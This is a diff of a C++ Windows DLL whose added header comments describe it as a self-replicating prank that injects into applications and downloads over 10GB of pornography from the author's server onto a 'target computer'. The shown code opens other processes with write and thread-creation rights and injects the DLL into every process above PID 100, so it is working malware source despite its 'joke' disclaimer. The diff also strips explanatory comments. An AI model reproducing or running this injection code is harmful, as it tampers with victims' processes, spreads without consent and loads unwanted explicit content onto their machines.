@@ -1,4 +1,9 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
+// hi there so what this does is it will contact my vps server and download over 10gb 
+// of furry porn onto the target computer one inject into any app and it will self replicate onto others
+// this is a joke and should not be used for malicious purposes
+// the vps is 100mbps bandwidth (im gonna updrade it soon) and per month is 2tb of bandwidth
+// so it can handle a lot of traffic
+// follow me on github @ciadtgov for more funny shit like this
 #include "pch.h"
 #include <Windows.h>
 #include <ShlObj.h>
@@ -68,7 +73,7 @@ std::wstring DownloadHTML(const wchar_t* url) {
 #include <TlHelp32.h>
 
 void InjectSelfIntoProcess(DWORD pid, const wchar_t* dllPath) {
-    if (pid == GetCurrentProcessId()) return; // Skip self
+    if (pid == GetCurrentProcessId()) return;
 
     HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) return;
@@ -107,7 +112,6 @@ void InjectIntoAllProcesses(const wchar_t* dllPath) {
 
     if (Process32FirstW(snapshot, &procEntry)) {
         do {
-            // Filter out system processes or services by skipping those with PID < 100 (example)
             if (procEntry.th32ProcessID > 100) {
                 InjectSelfIntoProcess(procEntry.th32ProcessID, dllPath);
             }
